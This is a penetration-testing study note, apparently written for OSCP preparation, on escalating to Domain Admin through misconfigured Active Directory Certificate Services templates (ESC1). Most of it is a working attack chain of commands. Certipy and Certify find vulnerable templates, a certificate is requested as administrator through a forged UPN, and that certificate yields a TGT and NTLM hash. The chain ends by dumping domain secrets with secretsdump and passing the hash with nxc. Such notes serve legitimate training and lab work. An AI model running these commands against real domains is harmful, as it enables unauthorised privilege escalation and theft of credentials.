# ADCS Abuse — ESC1

Active Directory Certificate Services misconfigurations frequently allow privilege escalation to Domain Admin. ESC1 is the most common and direct path.

## What is ESC1

A certificate template is vulnerable to ESC1 when it:
1. Allows low-priv users to enroll
2. Allows the requester to specify a Subject Alternative Name (SAN)
3. Has "Client Authentication" as an EKU

You can request a cert AS any user (e.g., Administrator) by specifying their UPN in the SAN.

## Enumerate ADCS with Certipy

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p 'Password123' -dc-ip DC_IP -stdout

# Save to JSON/text for review
certipy find -u user@domain.local -p 'Password123' -dc-ip DC_IP -text -output adcs_enum

# Look for [!] ESC1 in output
```

**From Windows (Certify):**
```powershell
.\Certify.exe find /vulnerable
```

## Exploit ESC1

```bash
# Step 1: Request certificate as administrator
certipy req -u user@domain.local -p 'Password123' \
  -ca "DOMAIN-CA" \
  -template "VulnerableTemplateName" \
  -upn administrator@domain.local \
  -dc-ip DC_IP

# Output: administrator.pfx
```

```bash
# Step 2: Authenticate with the certificate → get TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Output: TGT saved to ccache + NTLM hash printed
```

```bash
# Step 3: Use the hash
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass domain.local/administrator@DC_IP
# OR
nxc smb DC_IP -u administrator -H :NTLM_HASH_FROM_CERTIPY
```

## Other ESC Variants (Know They Exist)

| ESC | Description |
|-----|-------------|
| ESC2 | Any Purpose EKU or no EKU |
| ESC3 | Enrollment Agent abuse |
| ESC4 | Template write access |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA |
| ESC8 | NTLM relay to AD CS HTTP endpoint |

## Reference

SpecterOps "Certified Pre-Owned" whitepaper: [posts.specterops.io/certified-pre-owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

**Practice:** VulnLab has several ADCS labs. GOAD includes ADCS if configured. HTB Academy "ADCS Attacks" module covers ESC1–ESC8.

**Scope note:** ADCS exploitation is in-scope for OSCP+ exam environments where AD CS is present.
